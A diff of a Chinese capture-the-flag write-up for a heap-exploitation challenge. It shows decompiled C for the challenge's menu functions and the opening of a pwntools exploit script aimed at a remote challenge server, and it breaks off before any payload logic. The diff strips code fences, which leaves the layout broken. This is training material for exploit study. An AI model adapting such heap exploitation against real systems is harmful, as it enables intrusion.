@@ -385,11 +385,6 @@ https://bbs.kanxue.com/user-home-952954.htm
 ```
 一
 程序分析
-```
-
-
-
-```
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
  int choice; // [rsp+0h] [rbp-10h]
@@ -430,11 +425,6 @@ int __cdecl main(int argc, const char **argv, const char **envp)
  puts("Goodbye and welcome to use it next time.");
  return 0;
 }
-```
-
-
-
-```
 unsigned __int64 add()
 {
  signed int index; // [rsp+Ch] [rbp-14h]
@@ -473,11 +463,6 @@ unsigned __int64 add()
  }
  return __readfsqword(0x28u) ^ v4;
 }
-```
-
-
-
-```
 unsigned __int64 delete()
 {
  unsigned int v1; // [rsp+0h] [rbp-10h]
@@ -506,11 +491,6 @@ unsigned __int64 delete()
  }
  return __readfsqword(0x28u) ^ v3;
 }
-```
-
-
-
-```
 unsigned __int64 edit()
 {
  unsigned int v1; // [rsp+0h] [rbp-10h]
@@ -536,11 +516,6 @@ unsigned __int64 edit()
  }
  return __readfsqword(0x28u) ^ v3;
 }
-```
-
-
-
-```
 unsigned __int64 show()
 {
  unsigned int v1; // [rsp+0h] [rbp-10h]
@@ -565,11 +540,6 @@ unsigned __int64 show()
  }
  return __readfsqword(0x28u) ^ v3;
 }
-```
-
-
-
-```
 __int64 __fastcall my_read(__int64 a1, int a2)
 {
  unsigned int v3; // [rsp+10h] [rbp-10h]
@@ -583,38 +553,23 @@ __int64 __fastcall my_read(__int64 a1, int a2)
  }
  return v3;
 }
-```
-
-
-
-```
 二
 
 漏洞利用及原理
-```
-
-
-
-```
 三
 Exploit
-```
-
-
-
-```
 from pwn import *
 
-#p = process(["./ld-2.32.so", "./pwn"],env={"LD_PRELOAD":"./libc-2.32.so"})
-#p = process("./pwn")
+    #p = process(["./ld-2.32.so", "./pwn"],env={"LD_PRELOAD":"./libc-2.32.so"})
+    #p = process("./pwn")
 
 context(os='linux', arch='amd64', log_level='debug')
 p = remote("node2.yuzhian.com.cn",36361)
 
 libc = ELF("./libc-2.32.so")
-#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
-#gdb.attach(p)
+    #gdb.attach(p)
 sleep(1)
 
 def add(index,size):
